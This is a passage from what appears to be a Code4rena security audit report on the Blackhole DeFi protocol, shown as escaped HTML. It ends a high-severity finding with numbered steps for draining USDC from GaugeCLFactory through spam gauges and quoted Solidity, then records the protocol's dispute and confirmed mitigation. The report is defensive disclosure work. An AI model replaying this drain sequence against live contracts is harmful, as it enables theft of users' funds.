class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einvalidTokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"8\"\u003e\n\u003cli\u003e\u003ccode\u003e1e10\u003c/code\u003e (10,000) USDC has been transferred to the new algebra farm.\u003c/li\u003e\n\u003cli\u003eAttacker repeats step 2 to 6 for 5 times to fully transfer 50,000 USDC out of the \u003ccode\u003eGaugeCLFactory\u003c/code\u003e contract.\u003c/li\u003e\n\u003cli\u003eAttacker stakes relevant LP NFT into the spam gauges through the \u003ccode\u003eGaugeCL.deposit\u003c/code\u003e function:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisNotEmergency\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonfungiblePositionManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonfungiblePositionManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapproveForFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincentiveKeys\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epoolAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenterFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eDeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"11\"\u003e\n\u003cli\u003eAttacker directly calls the \u003ccode\u003eAlgebraEternalFarming.claimReward\u003c/code\u003e function to claim the rewards \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/FarmingCenter.sol#L119\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @inheritdoc IAlgebraEternalFarming\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_claimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_claimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimToZeroAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferHelper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRewardClaimed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole commented:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBlackhole Protocol disputes the classification of this issue as high severity, noting that the protocol is designed to deposit no more than \u003ccode\u003e$0.10\u003c/code\u003e worth of BLACK tokens, an amount sufficient to spawn over a million liquidity pools on Blackhole.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-6\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-53\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-13\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-13\" aria-label=\"medium risk findings 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (13)\u003c/h1\u003e\n\u003ch2 id=\"m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\" style=\"position:relative;\"\u003e\u003ca href=\"#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\" aria-label=\"m 01 minterupgradeable double subtracting smnft burns causes rebase underpayment permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-16\"\u003e[M-01] \u003ccode\u003eMinterUpgradeable\u003c/code\u003e: double-subtracting smNFT burns causes rebase underpayment\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-17\"\u003elonelybones\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-9\"\u003eAkxai\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-383\"\u003ecodexNature\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-417\"\u003ehakunamatata\u003c/a\u003e, and \u003ca 